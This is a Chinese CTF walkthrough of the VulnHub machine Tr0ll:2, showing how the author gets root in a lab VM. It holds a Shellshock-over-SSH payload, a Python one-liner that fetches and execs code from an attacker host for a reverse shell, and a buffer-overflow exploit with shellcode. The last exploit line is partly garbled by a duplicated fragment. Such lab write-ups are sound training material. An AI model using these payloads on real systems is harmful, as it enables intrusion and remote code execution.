> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OPlvs96el4PuKf7X948QuA)

靶机地址：https://www.vulnhub.com/entry/tr0ll-2,107/

靶机难度：中级（CTF）

靶机发布日期：2014 年 10 月 24 日

靶机描述：Tr0ll 系列 VM 中的下一台计算机，这比原始的 Tr0ll 难度有所提高，但是解决所需的时间大致相同，并且毫无疑问，巨魔仍然存在！

难度是从初学者到中级。

目标：得到 root 权限 & 找到 proof.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/HdnE6icjq3eZPJygSy2mR5Ax3mF0zbepD8wmYU9I1bm8ib991icToQ8wVaweOEGRHbsxe2wMVFN8GZ1Egzbict2RHA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/xsbHqF7AIDaKRb2LB6ykjvMB9uh7oLtyPpVdwZZW8a1eSW7CibZfDmCmT7UXWNnJMsogxXyreyY9AyR1WvNicsYg/640?wx_fmt=png)

展示 Tr0ll:2 的界面

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjQ8Z0IkQBtHmbEF6AKCrk6JRcCj50TXiaDobW3Lxq2ns5CzxauKFtYIQ/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjwl0Kn7ZkJyAWYXRJ4J83GEUEDnpic6vE9yQiaiah4LWibzsVcic5mJibxJiag/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.182.153

我们开始探索机器。第一步是找出目标计算机上可用的开放端口和一些服务

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjdh1UdWQD3o816jOfVD6VGdZ237ia8dgBfeavnmWQU8cylxK18lxQdrw/640?wx_fmt=png)

命令：

```
nmap -sS -sV -T5 -A -p- 192.168.182.153
```

可以在上面看到 Nmap 找到开放了 21、22、80 端口

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjtnzACWknWOYYnTUS9ia9xyqTWwLDnnY7Famj3btHj9IlGaTLhibGfRxA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjUpCkiaJ5ApNlyhexOpCpFfxAQaBMUfnbIWlxtxT5lqpp9MR4yHuftDg/640?wx_fmt=png)

直接访问 80，作者：Tr0ll..... 没啥特别有用的信息，将图片下载下来，里面查看也没啥信息

那就回去针对下 21 端口试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjnvgdIe2Wt2FlkI4TWybibBNyYvjRLx7Is3BiasYzGaX3XAeMmqXMxEkQ/640?wx_fmt=png)

登录输入账号密码，我用前面 80 端口发现的作者信息登录了下... 成功登录...

作者：Tr0ll

看到有一个名为 lmao 的 zip 文件，将他下载到本地

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjezfmInPjM8af8FsS2xVwjQu8U9icWBicNs3VSVvOicy3aibHue1uTnkRHw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj8p6viaIiaDy3oW6CgYbMzlk0124O7TMMWopLuCBICP5WpuOoBfXGlelg/640?wx_fmt=png)

unzip 解压发现需要密码... 破解未成功

那就从别的地方找密码了，回到 web 界面爆破

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjgOMKK9CVibw1eTnoibckpLp0VRGf5Hz67ccwzibqicib23OJCClkFwiczGYA/640?wx_fmt=png)

又发现了 rebots.txt 文件（下次渗透还是别扫了，直接访问试试有没有这个文件）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjknTgbydQJuJ2n1Xtibh0iavjVwVLuq2ibibf51x370Yog0t6uVaXPrgeOQ/640?wx_fmt=png)

一个接一个地尝试打开文件夹太花费时间了，用别的方式缩减时间！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjDVmYlcwWeo9Scw7WlycjInzctVPuwiaFbqOk5OTYcqlK5hwicmoSntHw/640?wx_fmt=png)

这边创建了一个文件夹方便找数据，然后将 rebots 文本下载

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjm9YTnntViaCLKEeZPllToGcrLiaV230Ckzc2ibIicdHhdMSBQicoyHDicuWw/640?wx_fmt=png)

继续用 dirb 扫描目录....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjWxPfmaTOYnfead6A9Fw3TZbolnPhKPg4hrO1382Ir0HArIa4YgMTQw/640?wx_fmt=png)

发现一张图... 真恶搞

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjJ94Ho1c53IyPCfYTU5miaafsCnBibvFOK60YtA7UkSeloJakcUqLGn6A/640?wx_fmt=png)

查看源代码，cat_the_troll.jpg 隐藏了一个 jpg 文件进入

```
http://192.168.182.153/dont_bother/cat_the_troll.jpg
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjbBSQnsWicUN5gh1PSskZka9PuyibvaricCXzLMIRniakCyA6YNxk8tuvkQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj3AGNgZ4dtJF63wU9RXX4t7blOr0MGo31fiaVdutdiaPj6XgznnBOckUw/640?wx_fmt=png)

下载到本地分析它！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj6c8sialjpjYEtpHwiaZBJFKrGwXE8dTNK1SXnnjkFfMpUvbfOzSDjRug/640?wx_fmt=png)

tail 命令可以将文件指定位置到文件结束的内容写到标准输出

命令：

```
tail -n 3 cat_the_troll.jpg
```

最后让我们深入 y0ur_self 去了解.... 访问

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjtvhctwiar2RzkQib2cedcl1fhOEfSltKcsJo1Nqy6pVdCvEABjEGA9Og/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj7Ne7gda7PU2JJ3p1VltXb182wpxwdHY79Fok5lwfiaLM3KRw2fQ5KXA/640?wx_fmt=png)

answer 文件全是 base64 值，这边进行解读

先下载到本地

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjK49ILchx3nUCImwZO8ufWO2icib8NQrdP1c7mp8Ykg5JreNKBibT5ycpQ/640?wx_fmt=png)下载后进行 base64 解码并放入新建文本中

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjpl4ic8R0muw98Qxt1u33fvtDXKO0jI51T84pBcO8HdyZ80lxb9eud1A/640?wx_fmt=png)

解码出很多很多值，这边可以开始对 lmao.zip 压缩文件进行攻击破解了.. 前面没有密码库

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj8RbQotU6VBM4mJucibBriaYoesqC4cdEgQUkhveN6grCKzMkc4DjHT1A/640?wx_fmt=png)

使用 fcrackzip 工具（专门用来破解 zip 密码）

PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL

登录

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjthu0yDVVu8n24LjgwIDKWVib1Khl9uWX4AA6ybGw9EKndXc7UUuCEicA/640?wx_fmt=png)成功登录，有个 noob 文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjUqojAQ7icfIBibGOfic3EpfCZdYbeus3d4JEnqkXiaPA5bB8CiaSWiczaBgA/640?wx_fmt=png)

SHA256 私钥！

![](https://mmbiz.qpic.cn/mmbiz_png/HdnE6icjq3eZPJygSy2mR5Ax3mF0zbepD8wmYU9I1bm8ib991icToQ8wVaweOEGRHbsxe2wMVFN8GZ1Egzbict2RHA/640?wx_fmt=png)

二、权限提升

![](https://mmbiz.qpic.cn/mmbiz_png/xsbHqF7AIDaKRb2LB6ykjvMB9uh7oLtyPpVdwZZW8a1eSW7CibZfDmCmT7UXWNnJMsogxXyreyY9AyR1WvNicsYg/640?wx_fmt=png)

我们用这个密码登录 22 端口试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjWmWvWdjtv1b7UTMty3bRvdBv0snM2yMLP15bQQTTOtlXkVP7q3poQQ/640?wx_fmt=png)

命令：

```
ssh -i noob noob@192.168.182.153
```

这里的意思是，链接失效了，可以登录需要外壳拿权限

这边试了有几种方法，一种一种试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj95c8rZpeicy3OcGdE1YQadTKvTeoY2tMaNJI9AE0ZYmOmUmZo9hGjicA/640?wx_fmt=png)

链接：

```
https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj9qAEq0fxY0q7q5sA9YDQicEVkgibY16IpJrkq1yj9CjAtIfjEGXpvFcw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjqzXb8ibQRPXNwJ6Xj387JiaXzwWmEqyo4ynR0I7XzDicxrdDTn8RNL3Wg/640?wx_fmt=png)

命令：

```
ssh noob@192.168.182.153 -i noob -t "() { :; }; /bin/bash"
```

学艺不精这里，脑补中... 终于成功进入

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjriaadHDPTHJOaAj9DI3tr4dN12ngsMZTfks1bLGVAJicicybnNzwEfpqw/640?wx_fmt=png)

这边看了目录，可能不够细心还是没信息，经验告诉我，这里要使用二进制、缓冲区溢出渗透了

这边我们使用 exploit 进行命令注入攻击拿到反弹 shell 在本地上

学习链接：https://www.hackingarticles.in/command-injection-exploitation-using-web-delivery-linux-windows/

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj4MUFCQz4QZCkqbBzkchyk5McHtRic4bXQHxNPp6OibUReyHjKPCQ89ww/640?wx_fmt=png)

run 跑起来

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjRuta5PICW1dstS0XVjtwtsVG9brCibFpDFnEyRwByOHlYTLGTF56S0Q/640?wx_fmt=png)

```
python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.182.149:8080/AYTur8RzbbdxJ');exec(r.read());"
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjBImJQ87cITEXHtBzHibHiaaEP8bns6iaLjwhq3qLa8tbB8HQrnu2C4KIg/640?wx_fmt=png)

这边进行跑 shell

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjrv3N0u2ELdMyiaiaoz3QT38ZLmqmosBwluBZwziaYozPibWYevCia3maH9g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjrzHW84OasvuN8VLHsoUfqoJFtshmcxwNAo8uhE1SN3iczW1kQJVb23g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjS1vRCQrC42cReUQ9hbt2Sab8ZsrtgrVz6Y8xS7m1YfIJ6N6dYiaqdHw/640?wx_fmt=png)

开始是不成功的，后面在慢慢跑动后，使用 session 2 就进入了...

使用 python -c 'import pty; pty.spawn("/bin/bash")'进入 noob 用户

这边开始进一步查看

命令：

```
find / -perm -4000 2>/dev/null
```

使用 find 查看底层目录

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjHQSxZibnIgxMs0c9nY02MlpkcIFVLrEoM2Yf5ZZlncECUassh7KNFYg/640?wx_fmt=png)

果然是缓冲区溢出的题... 我的弱项，好吧继续冲

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj1oRzCKbuhpvyReYmdnFOg4fm2ibQLiaiaOtLPWVzO12IHEYHxCta99yZQ/640?wx_fmt=png)

先查看 door2，让我们输入

用 gdb 进行拆解

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjbhib9Vkxw9mAXbKA7tfcfUh8YBONTPiayGyVTaicExGnSIhTtfuiadz3gg/640?wx_fmt=png)

```
命令：gdb -q r00t（加载执行r00t程序发生溢出时来跟踪EIP的值）
命令：set disassembly-flavor intel（转换为intel格式的汇编）
命令：disas main（显示main函数对应的汇编代码）
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj8iamym1OvZHq9tBdWwZFqtkkHibtibpAbicD2sq9KZ93kuCXlIIiaJm1cVg/640?wx_fmt=png)

这边使用 Metasploit 实现对缓冲区栈的溢出攻击

使用 Metasploit 中的 pattern_create.rb 脚本生成字符序列

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj2BExIBkB2ep3iba5oVN2XiaISyeMB0Mic3T4HbgHIhofiaZUMszQzibibuicw/640?wx_fmt=png)

```
cd /usr/share/metasploit-framework/tools/exploit/（进入msf的EXP库）
./pattern_create.rb -l 500（可以看到我们只要在pattern_create.rb脚本的后面加上-L字符序列长度就可以生成指定长度的字符序列，查看了500的长度即可）
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjkKMgcDIxMohGibLcte8hxdjagKER3Pv46ibBCx8eLQYdgmpB8GwEsPPA/640?wx_fmt=png)

这边 R 跑下这个值，提示故障表示已经溢出了：

```
0x6a413969
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjXdSH5VOYibEpbKPCtZJptQcbbS24t4XYV3Ql8kSQujicpPz00Kug46icQ/640?wx_fmt=png)

Metasploit 下的 pattern_offset.rb，首先我们先查看 pattern_offset.rb 脚本的帮助信息

这边 - q 是执行 Aa0A（溢出值的 6a413969）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjEKibODtUEa9juibhbJf2OVWAInB57LicNXXs81UAL2Y7WwKY9IQtGVeCg/640?wx_fmt=png)

命令：

```
./pattern_offset.rb -q 6a413969
```

返回偏移量结果 268

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjKMfZUvcW7TnhaPv0Keg6v2CLjsVhUJEJVmf7A1zwjIUOiar8HX4c4fQ/640?wx_fmt=png)

参考：https://blog.csdn.net/ll352071639/article/details/42304619

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttj4jd745hD2Dua7cF4GcCbMlQEicn0BatXqtabrfOwHLazL3UDbAMaQEQ/640?wx_fmt=png)

命令：i r esp（查看浮点）

得到了 EXP 的位置是 0xbffffa80（真难理解）

现在需要获取一些 shellcode，www.shell-storm.org/shellcode 这是非常好的一个写 shellcode 的学习网站，利用存储已编写的 Shellcode。因为它运行在 Intel，并且操作系统是 32 位 Linux，因此我从此处获取 Shellcode 连接：

```
http : //shell-storm.org/shellcode/files/shellcode-827.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjkOjyVznGqGRMWz3pySxURt7TMJjwBQGWvBH53VAXFxbIX8mUk5PgVg/640?wx_fmt=png)

```
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
      "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
```

有了 shellcode 就有了制作缓冲区溢出所需的三个组件，我的模板：

二进制中到缓冲区里的 EIP+ESP 位置 + 268+Shellcode

```
./r00t $(python -c "print 'A' * 268 + '\x80\xfb\xff\xbf' + '\x90' * 16 + '\xba\xa0\x7b\x18\x95\xdb\xcd\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\x55\x11\x13\xcd\x0c\xb4\x45\x85\x03\x5a\x03\xb2\x33\xb3\x60\x55\xc3\xa3\xa9\xc7\xaa\x5d\x3f\xe4\x7e\x4a\x37\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93'") <7\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93'")
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOOwmngwicsvusrFVnmwFttjan4ZmJoR4LjBENzf5WbYibicGIYddM4IIKpG3LSJZuC0Rgyic9l0DTo5g/640?wx_fmt=png)

这边通过溢出拿到了 root 权限，Proof.txt：

```
a70354f0258dcc00292c72aab3c8b1e4
```

You win this time young Jedi...

![](https://mmbiz.qpic.cn/mmbiz_png/9Ku2t1uaSwDSnPM80libzbs8ofzicXbQesVN9mGMnqZPxqCS8gUoHLkVWJkEPByShv4ul050UUYX4Phfnnc5lLJQ/640?wx_fmt=png)

由于我们已经成功得到 root 权限 & 找到 proof.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaRSfuVibrT80ovdTMiaZM0gZOFHmtS8KYVtVHtFNaz9XcENaibWibgmw8JIn1niaCurDOrBCjUbQ8az7fdzNMu8kTrw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/gCicgvu68od8ibyiahYEJ6XV4kkaUeCEMF4HvIuuPYGVxwMtGDTnb3ibDXjDke8TFG6yicwwEJ2Ik6QzI6c7oT5iczvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MKHUQ8R7BXBibc5TT0bsGFoG25ZFjUbyQtK7icU5VDD6Lxme5yKgoWpaDXd9HmZ1kfkhR3dbQ80dlu2jHJBSkCPQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VGhME4y0QLo3MIKX2xqqYXyKcoyCiaukQAj90M7CCMfhUskicraSNIaK2icT70MmUaHEJKiat91cPOZRkEs78qAHlQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

星球每月都有网络安全书籍赠送、各种渗透干货分享、小伙伴们深入交流

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvyRzpZ9K5N6QrjibbJsVd3xX7Q4wDYSsBJYyNJdyjYabp5NkcDj9GEhA/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

渗透攻防：  

欢迎加入

大余安全

公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvX3CVuhiba4mw8DqJicOMwaDJyErymjibZhiaZNKMtWzn2rX17pcK3Cd7Cw/640?wx_fmt=png)